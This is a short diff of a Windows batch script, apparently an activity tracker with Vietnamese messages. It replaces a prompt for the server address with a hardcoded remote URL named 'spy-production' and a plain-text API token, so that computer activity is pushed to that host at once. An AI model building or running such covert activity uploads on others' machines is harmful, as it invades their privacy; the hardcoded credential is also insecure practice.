@@ -5,19 +5,14 @@ echo    Windows Activity Tracker - Bấm chạy là đẩy ngay Railway
 echo ========================================================
 echo.
 
+set SERVER_URL=https://spy-production-8aaa.up.railway.app
+set API_TOKEN=hoanganh
+
 if exist "server_url.txt" (
     set /p SERVER_URL=<server_url.txt
-) else (
-    echo Vui lòng dán link domain Railway của bạn (ví dụ: https://spy-production.up.railway.app):
-    set /p SERVER_URL="Link Railway: "
-    echo !SERVER_URL!
-    echo %SERVER_URL%>server_url.txt
 )
 
-if "%SERVER_URL%"=="" set SERVER_URL=http://localhost:8000
-set API_TOKEN=default-secret-token
-
-echo [*] Đang chụp và đẩy ngay lập tức hoạt động máy tính lên Railway...
+echo [*] Đang kích hoạt và đẩy ngay lập tức hoạt động máy tính lên Railway...
 echo Server mục tiêu: %SERVER_URL%
 echo.
 
